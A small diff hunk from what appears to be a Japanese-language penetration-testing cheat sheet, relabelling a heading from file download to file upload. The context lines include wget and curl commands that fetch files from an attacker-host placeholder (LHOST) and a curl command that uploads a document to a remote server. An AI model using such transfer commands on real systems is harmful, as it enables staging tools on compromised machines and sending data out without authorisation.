@@ -145,7 +145,7 @@ wget http://lhost/file
 ```bash
 curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
 ```
-#### ファイルのダウンロード
+#### ファイルのアップロード
 ```bash
 curl -F "file=@mydocument.pdf" https://example.com/upload
 ```
